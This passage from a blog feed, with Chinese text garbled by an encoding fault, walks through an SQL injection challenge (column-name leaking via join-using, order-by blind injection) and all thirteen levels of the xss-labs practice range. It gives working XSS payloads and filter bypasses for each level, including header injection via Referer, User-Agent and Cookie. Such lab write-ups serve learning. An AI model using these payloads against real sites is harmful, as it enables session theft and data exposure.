class="number">3</span>;</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240226232830882.png" alt="image-20240226232830882"></p><h4 id="join-using"><a href="#join-using" class="headerlink" title="join using"></a>join using</h4><p>è¿™é‡Œéœ€è¦æœ‰æŠ¥é”™å›æ˜¾</p><p>payload:</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> users <span class="keyword">where</span> id<span class="operator">=</span><span class="number">-1</span> <span class="keyword">union</span> <span class="keyword">all</span> <span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> (<span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> users <span class="keyword">as</span> a <span class="keyword">join</span> users <span class="keyword">as</span> b)<span class="keyword">as</span> c;</span><br></pre></td></tr></table></figure><p>æŠ¥å‡ºç¬¬ä¸€ä¸ªåˆ—åä¸ºid</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> users <span class="keyword">where</span> id<span class="operator">=</span><span class="number">-1</span> <span class="keyword">union</span> <span class="keyword">all</span> <span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> (<span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> users <span class="keyword">as</span> a <span class="keyword">join</span> users <span class="keyword">as</span> b <span class="keyword">using</span>(id))<span class="keyword">as</span> c;</span><br></pre></td></tr></table></figure><p>æŠ¥å‡ºç¬¬äºŒä¸ªåˆ—åä¸ºusername</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> users <span class="keyword">where</span> id<span class="operator">=</span><span class="number">-1</span> <span class="keyword">union</span> <span class="keyword">all</span> <span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> (<span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> users <span class="keyword">as</span> a <span class="keyword">join</span> users <span class="keyword">as</span> b <span class="keyword">using</span>(id,username))<span class="keyword">as</span> c;</span><br></pre></td></tr></table></figure><p>ä»¥æ­¤ç±»æ¨</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240226233801718.png" alt="image-20240226233801718"></p><h4 id="order-byç›²æ³¨"><a href="#order-byç›²æ³¨" class="headerlink" title="order byç›²æ³¨"></a>order byç›²æ³¨</h4><p>é€šè¿‡å­—å…¸åºæ¥çŒœæµ‹å†…å®¹</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> users <span class="keyword">where</span> id<span class="operator">=</span><span class="number">1</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="string">&#x27;a&#x27;</span>,<span class="number">3</span> <span class="keyword">order</span> <span class="keyword">by</span> <span class="number">2</span>;#a <span class="operator">&lt;</span> h,å›æ˜¾a</span><br><span class="line"><span class="operator">+</span><span class="comment">----+----------+----------+</span></span><br><span class="line"><span class="operator">|</span> id <span class="operator">|</span> username <span class="operator">|</span> password <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">----+----------+----------+</span></span><br><span class="line"><span class="operator">|</span>  <span class="number">1</span> <span class="operator">|</span> a        <span class="operator">|</span> <span class="number">3</span>        <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span>  <span class="number">1</span> <span class="operator">|</span> hcj      <span class="operator">|</span> <span class="number">123456</span>   <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">----+----------+----------+</span></span><br><span class="line"><span class="number">2</span> <span class="keyword">rows</span> <span class="keyword">in</span> <span class="keyword">set</span> (<span class="number">0.00</span> sec)</span><br><span class="line"></span><br><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> users <span class="keyword">where</span> id<span class="operator">=</span><span class="number">1</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="string">&#x27;i&#x27;</span>,<span class="number">3</span> <span class="keyword">order</span> <span class="keyword">by</span> <span class="number">2</span>;</span><br><span class="line"><span class="operator">+</span><span class="comment">----+----------+----------+</span></span><br><span class="line"><span class="operator">|</span> id <span class="operator">|</span> username <span class="operator">|</span> password <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">----+----------+----------+</span></span><br><span class="line"><span class="operator">|</span>  <span class="number">1</span> <span class="operator">|</span> hcj      <span class="operator">|</span> <span class="number">123456</span>   <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span>  <span class="number">1</span> <span class="operator">|</span> i        <span class="operator">|</span> <span class="number">3</span>        <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">----+----------+----------+</span></span><br><span class="line"><span class="number">2</span> <span class="keyword">rows</span> <span class="keyword">in</span> <span class="keyword">set</span> (<span class="number">0.00</span> sec)</span><br><span class="line"></span><br><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> users <span class="keyword">where</span> id<span class="operator">=</span><span class="number">1</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="string">&#x27;hci&#x27;</span>,<span class="number">3</span> <span class="keyword">order</span> <span class="keyword">by</span> <span class="number">2</span>;</span><br><span class="line"><span class="operator">+</span><span class="comment">----+----------+----------+</span></span><br><span class="line"><span class="operator">|</span> id <span class="operator">|</span> username <span class="operator">|</span> password <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">----+----------+----------+</span></span><br><span class="line"><span class="operator">|</span>  <span class="number">1</span> <span class="operator">|</span> hci      <span class="operator">|</span> <span class="number">3</span>        <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span>  <span class="number">1</span> <span class="operator">|</span> hcj      <span class="operator">|</span> <span class="number">123456</span>   <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">----+----------+----------+</span></span><br><span class="line"><span class="number">2</span> <span class="keyword">rows</span> <span class="keyword">in</span> <span class="keyword">set</span> (<span class="number">0.00</span> sec)</span><br><span class="line"></span><br><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> users <span class="keyword">where</span> id<span class="operator">=</span><span class="number">1</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="string">&#x27;hck&#x27;</span>,<span class="number">3</span> <span class="keyword">order</span> <span class="keyword">by</span> <span class="number">2</span>;</span><br><span class="line"><span class="operator">+</span><span class="comment">----+----------+----------+</span></span><br><span class="line"><span class="operator">|</span> id <span class="operator">|</span> username <span class="operator">|</span> password <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">----+----------+----------+</span></span><br><span class="line"><span class="operator">|</span>  <span class="number">1</span> <span class="operator">|</span> hcj      <span class="operator">|</span> <span class="number">123456</span>   <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span>  <span class="number">1</span> <span class="operator">|</span> hck      <span class="operator">|</span> <span class="number">3</span>        <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">----+----------+----------+</span></span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;SWPU2019-Web1&quot;&gt;&lt;a href=&quot;#SWPU2019-Web1&quot; class=&quot;headerlink&quot; title=&quot;SWPU2019-Web1&quot;&gt;&lt;/a&gt;SWPU2019-Web1&lt;/h1&gt;&lt;p&gt;åœ¨æ³¨å†Œç™»å½•åå¹¿å‘Šç”³è¯·å¤„ å¹¿å‘Šåå­—æ®µå­˜åœ¨æ³¨å…¥&lt;/p&gt;
</summary>
      
    
    
    
    <category term="buuåˆ·é¢˜è®°å½•" scheme="http://example.com/categories/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/"/>
    
    
    <category term="mysqlç»•è¿‡information_schemaæ³¨å…¥" scheme="http://example.com/tags/mysql%E7%BB%95%E8%BF%87information-schema%E6%B3%A8%E5%85%A5/"/>
    
  </entry>
  
  <entry>
    <title>xss-labs</title>
    <link href="http://example.com/2024/02/20/xss-labs/"/>
    <id>http://example.com/2024/02/20/xss-labs/</id>
    <published>2024-02-20T10:07:56.000Z</published>
    <updated>2024-02-24T02:50:23.732Z</updated>
    
    <content type="html"><![CDATA[<h1 id="xss-labs"><a href="#xss-labs" class="headerlink" title="xss-labs"></a>xss-labs</h1><p>æ‰‹åŠ¨æ­å»ºäº†ä¸€ä¸ªæœ¬åœ°é¶åœº</p><p>åŸgithubé¡¹ç›®åœ°å€</p><p><a href="https://github.com/do0dl3/xss-labs">https://github.com/do0dl3/xss-labs</a></p><h2 id="level-1"><a href="#level-1" class="headerlink" title="level 1"></a>level 1</h2><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240220181007551.png"></p><h2 id="level-2-â€œ-é—­åˆ"><a href="#level-2-â€œ-é—­åˆ" class="headerlink" title="level 2(â€œ&gt;é—­åˆ)"></a>level 2(â€œ&gt;é—­åˆ)</h2><p>äº§çœ‹æºç å‘ç°ä¸ä¸Šä¸€å…³ä¸åŒçš„æ˜¯ä½¿ç”¨äº†ä»¥ä¸‹å‡½æ•°:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//htmlspecialchars($str)</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;h2 align=center&gt;æ²¡æœ‰æ‰¾åˆ°å’Œ&quot;</span>.<span class="title function_ invoke__">htmlspecialchars</span>(<span class="variable">$str</span>).<span class="string">&quot;ç›¸å…³çš„ç»“æœ.&lt;/h2&gt;&quot;</span>.<span class="string">&#x27;&lt;center&gt;</span></span><br></pre></td></tr></table></figure><p>ä½†æ˜¯åœ¨å¦ä¸€ä¸ªä½ç½®ä¹Ÿå°±æ˜¯è¾“å…¥æ¡†å†…, å¹¶æ²¡æœ‰ä½¿ç”¨</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;h2 align=center&gt;æ²¡æœ‰æ‰¾åˆ°å’Œ&quot;</span>.<span class="title function_ invoke__">htmlspecialchars</span>(<span class="variable">$str</span>).<span class="string">&quot;ç›¸å…³çš„ç»“æœ.&lt;/h2&gt;&quot;</span>.<span class="string">&#x27;&lt;center&gt;</span></span><br><span class="line"><span class="string">&lt;form action=level2.php method=GET&gt;</span></span><br><span class="line"><span class="string">&lt;input name=keyword  value=&quot;&#x27;</span>.<span class="variable">$str</span>.<span class="string">&#x27;&quot;&gt; </span></span><br></pre></td></tr></table></figure><p>æ­¤æ—¶å¯ä»¥æ„é€ é—­åˆæ‰inputåŠå…¶å±æ€§</p><p>payload:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;&gt;&lt;script&gt;alert(1);&lt;/script&gt;</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240223163910163.png" alt="image-20240223163910163"></p><h2 id="level-3-æ„é€ é¼ æ ‡äº‹ä»¶"><a href="#level-3-æ„é€ é¼ æ ‡äº‹ä»¶" class="headerlink" title="level 3(æ„é€ é¼ æ ‡äº‹ä»¶)"></a>level 3(æ„é€ é¼ æ ‡äº‹ä»¶)</h2><p>ç›¸è¾ƒäºä¸Šä¸€å…³, è¿™å…³éƒ½åŠ äº† htmlspecialchars($str) è¿›è¡Œè½¬ä¹‰</p><p>ä½†æ˜¯</p><blockquote><p>htmlspecialchars($str) é»˜è®¤ä¸è½¬ä¹‰å•å¼•å·</p></blockquote><p>å› æ­¤å¯ä»¥æ„é€ ä¸€ä¸ªonclickæ—¶é—´, ç‚¹å‡»åæ‰§è¡Œjsä»£ç </p><p>payload:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27; onclick=&#x27;alert(1)</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240223164554832.png" alt="image-20240223164554832"></p><p>ç‚¹å‡»è¾“å…¥æ¡†å°±ä¼šæ‰§è¡Œjs</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240223164620880.png" alt="image-20240223164620880"></p><h2 id="level-4-æ„é€ é¼ æ ‡äº‹ä»¶"><a href="#level-4-æ„é€ é¼ æ ‡äº‹ä»¶" class="headerlink" title="level 4(æ„é€ é¼ æ ‡äº‹ä»¶)"></a>level 4(æ„é€ é¼ æ ‡äº‹ä»¶)</h2><p>ç®€å•æµ‹è¯•å‘ç°è¿™é‡Œç›´æ¥åˆ é™¤äº†å°–æ‹¬å·, ä½†æ˜¯å¹¶æ²¡æœ‰åˆ é™¤åŒå¼•å·, å¹¶ä¸”ä¹Ÿæ²¡å¯¹åŒå¼•å·è¿›è¡Œè½¬ä¹‰</p><p>æ°å·§è¿™é‡Œçš„valueå±æ€§ä½¿ç”¨åŒå¼•å·é—­åˆ</p><p>åªéœ€å°†ä¸Šä¸€é¢˜çš„å•å¼•å·æ”¹ä¸ºåŒå¼•å·å³å¯</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot; onclick=&quot;alert(1)</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240223165143411.png" alt="image-20240223165143411"></p><h2 id="level-5-ä¼ªåè®®JavaScript"><a href="#level-5-ä¼ªåè®®JavaScript" class="headerlink" title="level 5(ä¼ªåè®®JavaScript:)"></a>level 5(ä¼ªåè®®JavaScript:)</h2><p>è¿™å…³ä¼¼ä¹æ·»åŠ äº†é»‘åå•,ä¹‹å‰çš„<code>&lt;script&gt; onclick</code>ä¼šè¢«ä¿®æ”¹ä¸º<code>o_nclick &lt;scr_ipt&gt;</code></p><p>ä½¿ç”¨**JavaScript:**ä¼ªåè®®æ¥æ‰§è¡Œjs</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;&gt;&lt;a href=javascript:alert(1)&gt;</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240223170134184.png" alt="image-20240223170134184"></p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240223170148930.png" alt="image-20240223170148930"></p><p>ç‚¹å‡»æ’å…¥çš„è¶…é“¾æ¥å³å¯</p><h2 id="level-6-å¤§å°å†™ç»•è¿‡"><a href="#level-6-å¤§å°å†™ç»•è¿‡" class="headerlink" title="level 6 (å¤§å°å†™ç»•è¿‡)"></a>level 6 (å¤§å°å†™ç»•è¿‡)</h2><p>è¿™é‡Œä½¿ç”¨ä¸Šä¸€å…³çš„payloadä¼šå‘ç°hrefä¹Ÿè¢«è¿‡æ»¤äº†</p><p>ä½†æ˜¯æˆ‘ä»¬çŸ¥é“, htmlæ˜¯å¤§å°å†™ä¸æ•æ„Ÿçš„</p><p>ç›´æ¥æ„é€ </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;&gt;&lt;a hREf=javascript:alert(1)&gt;</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240223170543131.png" alt="image-20240223170543131"></p><p>éƒ¨åˆ†æºç :</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$str</span> = <span class="variable">$_GET</span>[<span class="string">&quot;keyword&quot;</span>];</span><br><span class="line"><span class="variable">$str2</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;&lt;script&quot;</span>,<span class="string">&quot;&lt;scr_ipt&quot;</span>,<span class="variable">$str</span>);</span><br><span class="line"><span class="variable">$str3</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;on&quot;</span>,<span class="string">&quot;o_n&quot;</span>,<span class="variable">$str2</span>);</span><br><span class="line"><span class="variable">$str4</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;src&quot;</span>,<span class="string">&quot;sr_c&quot;</span>,<span class="variable">$str3</span>);</span><br><span class="line"><span class="variable">$str5</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;data&quot;</span>,<span class="string">&quot;da_ta&quot;</span>,<span class="variable">$str4</span>);</span><br><span class="line"><span class="variable">$str6</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;href&quot;</span>,<span class="string">&quot;hr_ef&quot;</span>,<span class="variable">$str5</span>);</span><br></pre></td></tr></table></figure><h2 id="level-7-åŒå†™ç»•è¿‡"><a href="#level-7-åŒå†™ç»•è¿‡" class="headerlink" title="level 7(åŒå†™ç»•è¿‡)"></a>level 7(åŒå†™ç»•è¿‡)</h2><p>è¿™å…³ä¼šåˆ é™¤äº†script  href ç­‰ç­‰å­—ç¬¦ä¸²</p><p>åªéœ€è¦åŒå†™ç»•è¿‡å³å¯</p><p>payload:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;&gt;&lt;a hrhrefef=javascrscriptipt:alert(1)&gt;</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240223171113140.png" alt="image-20240223171113140"></p><p>éƒ¨åˆ†æºç </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$str</span> =<span class="title function_ invoke__">strtolower</span>( <span class="variable">$_GET</span>[<span class="string">&quot;keyword&quot;</span>]);</span><br><span class="line"><span class="variable">$str2</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;script&quot;</span>,<span class="string">&quot;&quot;</span>,<span class="variable">$str</span>);</span><br><span class="line"><span class="variable">$str3</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;on&quot;</span>,<span class="string">&quot;&quot;</span>,<span class="variable">$str2</span>);</span><br><span class="line"><span class="variable">$str4</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;src&quot;</span>,<span class="string">&quot;&quot;</span>,<span class="variable">$str3</span>);</span><br><span class="line"><span class="variable">$str5</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;data&quot;</span>,<span class="string">&quot;&quot;</span>,<span class="variable">$str4</span>);</span><br><span class="line"><span class="variable">$str6</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;href&quot;</span>,<span class="string">&quot;&quot;</span>,<span class="variable">$str5</span>);</span><br></pre></td></tr></table></figure><h2 id="level-8-å®ä½“ç¼–ç ç»•è¿‡"><a href="#level-8-å®ä½“ç¼–ç ç»•è¿‡" class="headerlink" title="level 8(å®ä½“ç¼–ç ç»•è¿‡)"></a>level 8(å®ä½“ç¼–ç ç»•è¿‡)</h2><p>è¿™å…³è¿‡æ»¤çš„æ›´åŠ ä¸¥æ ¼, å¤§å°å†™, è½¬ä¹‰, æ›¿æ¢ éƒ½ç”¨ä¸Šäº†</p><p>ä½†æ˜¯æˆ‘ä»¬è¾“å…¥çš„å†…å®¹ä¼šè¢«æ”¾è¿›ä¸€ä¸ªè¶…é“¾æ¥é‡Œ</p><p>å¯ä»¥ä½¿ç”¨å®ä½“ç¼–ç æ¥ç»•è¿‡å¯¹æˆ‘ä»¬è¾“å…¥å†…å®¹çš„æ›¿æ¢</p><p><a href="https://www.qqxiuzi.cn/bianma/zifushiti.php">https://www.qqxiuzi.cn/bianma/zifushiti.php</a></p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240223172033713.png" alt="image-20240223172033713"></p><p>payload:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&amp;#x6A;&amp;#x61;&amp;#x76;&amp;#x61;&amp;#x73;&amp;#x63;&amp;#x72;&amp;#x69;&amp;#x70;&amp;#x74;&amp;#x3A;&amp;#x61;&amp;#x6C;&amp;#x65;&amp;#x72;&amp;#x74;&amp;#x28;&amp;#x31;&amp;#x29;</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240223172232860.png" alt="image-20240223172232860"></p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240223172002536.png" alt="image-20240223172002536"></p><h2 id="level-9"><a href="#level-9" class="headerlink" title="level 9"></a>level 9</h2><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240223172339270.png" alt="image-20240223172339270"></p><p>è¿™å…³æˆ‘ä»¥ä¸ºæ˜¯è¯†åˆ«åˆ°ç¼–ç äº†, å®é™…ä¸Šæ˜¯éœ€è¦å«æœ‰<code>http://</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="literal">false</span>===<span class="title function_ invoke__">strpos</span>(<span class="variable">$str7</span>,<span class="string">&#x27;http://&#x27;</span>))</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">&#x27;&lt;center&gt;&lt;BR&gt;&lt;a href=&quot;æ‚¨çš„é“¾æ¥ä¸åˆæ³•ï¼Ÿæœ‰æ²¡æœ‰ï¼&quot;&gt;å‹æƒ…é“¾æ¥&lt;/a&gt;&lt;/center&gt;&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">&#x27;&lt;center&gt;&lt;BR&gt;&lt;a href=&quot;&#x27;</span>.<span class="variable">$str7</span>.<span class="string">&#x27;&quot;&gt;å‹æƒ…é“¾æ¥&lt;/a&gt;&lt;/center&gt;&#x27;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¿™é‡Œå¹¶æ²¡æœ‰è¦æ±‚è¦ä»¥<code>http://</code>å¼€å¤´, æ‰€ä»¥åªéœ€è¦æŠŠå®ƒåŠ åœ¨åé¢å¹¶æ³¨é‡Šæ‰å³å¯</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&amp;#x6A;&amp;#x61;&amp;#x76;&amp;#x61;&amp;#x73;&amp;#x63;&amp;#x72;&amp;#x69;&amp;#x70;&amp;#x74;&amp;#x3A;&amp;#x61;&amp;#x6C;&amp;#x65;&amp;#x72;&amp;#x74;&amp;#x28;&amp;#x31;&amp;#x29;//http://</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240223172906831.png" alt="image-20240223172906831"></p><h2 id="level-10-ä¿®æ”¹hiddenå†…å®¹"><a href="#level-10-ä¿®æ”¹hiddenå†…å®¹" class="headerlink" title="level 10(ä¿®æ”¹hiddenå†…å®¹)"></a>level 10(ä¿®æ”¹hiddenå†…å®¹)</h2><p>éšä¾¿è¾“å…¥ä¸€ä¸‹, å‘ç°è¿™é‡Œè¿˜æœ‰å‡ ä¸ªéšè—å‚æ•°</p><p>è¿™é‡Œå°è¯•getå°†åŒåéƒ½æäº¤ä¸€é</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">http://xss-labs/level10.php</span><br><span class="line">?keyword=1</span><br><span class="line">&amp;t_link=2</span><br><span class="line">&amp;t_history=3</span><br><span class="line">&amp;t_sort=4</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240223173715090.png" alt="image-20240223173715090"></p><p>å‘ç°t_sortæ˜¯æœ‰å›æ˜¾çš„</p><p>ç®€å•æµ‹è¯•åå‘ç°ä¼šåˆ é™¤å°–æ‹¬å·, ä½†ä¾ç„¶å¯ä»¥æ„é€ é¼ æ ‡äº‹ä»¶</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">?keyword=1</span><br><span class="line">&amp;t_link=2</span><br><span class="line">&amp;t_history=3</span><br><span class="line">&amp;t_sort=4&quot; onclick=&quot;alert(1)&quot; type=&quot;text&quot;</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240223173920165.png" alt="image-20240223173920165"></p><h2 id="level-11-refereræ³¨å…¥"><a href="#level-11-refereræ³¨å…¥" class="headerlink" title="level 11(refereræ³¨å…¥)"></a>level 11(refereræ³¨å…¥)</h2><p>è¿™é‡ŒæŸ¥çœ‹æºç ä¼šå‘ç°æœ‰ä¸€ä¸ªå‚æ•°çš„å€¼éå¸¸ç‰¹æ®Š</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240223174342942.png" alt="image-20240223174342942"></p><p>è¿™ä¸ªt_refçš„å€¼æ­£å¼æˆ‘ä»¬ä¸Šä¸€å…³çš„åœ°å€å’Œpayload</p><p>æˆ‘ä»¬éƒ½çŸ¥é“httpå¤´çš„refereræ­£æ˜¯è®°å½•äº†ä¸Šä¸€ä¸ªé¡µé¢çš„åœ°å€, æ‰€ä»¥è¿™é‡Œå¯ä»¥é€šè¿‡ä¿®æ”¹refereræ¥æ³¨å…¥</p><p>æ·»åŠ httpå¤´:</p><p><code>Referer: &quot; onclick=&quot;alert(1)&quot; type=&quot;text&quot;</code></p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240223174857257.png" alt="image-20240223174857257"></p><h2 id="level-12-User-Agentæ³¨å…¥"><a href="#level-12-User-Agentæ³¨å…¥" class="headerlink" title="level 12(User-Agentæ³¨å…¥)"></a>level 12(User-Agentæ³¨å…¥)</h2><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240223175032662.png" alt="image-20240223175032662"></p><p>è¿™é‡Œåˆå¤šå‡ºæ¥ä¸€ä¸ªt_ua ä¸å¿…å¤šè¯´, User-Agentæ³¨å…¥</p><p>ä¿®æ”¹User-Agentå³å¯</p><p><code>User-Agent: &quot; onclick=&quot;alert(1)&quot; type=&quot;text&quot;</code></p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240223175138909.png" alt="image-20240223175138909"></p><h2 id="level-13-cookieæ³¨å…¥"><a href="#level-13-cookieæ³¨å…¥" class="headerlink" title="level 13(cookieæ³¨å…¥)"></a>level 13(cookieæ³¨å…¥)</h2><p>è¿™é‡ŒæŠ“åŒ…ä¼šå‘ç°å¸¦äº†ä¸€ä¸ªcookie, è¿”å›å†…å®¹t_cookä¸­çš„å†…å®¹æ­£å¥½æ˜¯cookieä¸­çš„å†…å®¹</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240223175436189.png" alt="image-20240223175436189"></p><p>æ›´æ”¹cookieä¸­çš„å†…å®¹ä¸ºå‰ä¸¤å…³çš„payloadå³å¯</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240223175555490.png" alt="image-20240223175555490"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;xss-labs&quot;&gt;&lt;a href=&quot;#xss-labs&quot; class=&quot;headerlink&quot; title=&quot;xss-labs&quot;&gt;&lt;/a&gt;xss-labs&lt;/h1&gt;&lt;p&gt;æ‰‹åŠ¨æ­å»ºäº†ä¸€ä¸ªæœ¬åœ°é¶åœº&lt;/p&gt;
&lt;p&gt;åŸgithubé¡¹ç›®åœ°å€&lt;/p&gt;
&lt;p&gt;&lt;a href=</summary>
      
    
    
    
    <category term="é¶åœº" scheme="http://example.com/categories/%E9%9D%B6%E5%9C%BA/"/>
    
    
    <category term="xss" scheme="http://example.com/tags/xss/"/>
    
  </entry>
  
  <entry>
    <title>Upload-labs</title>
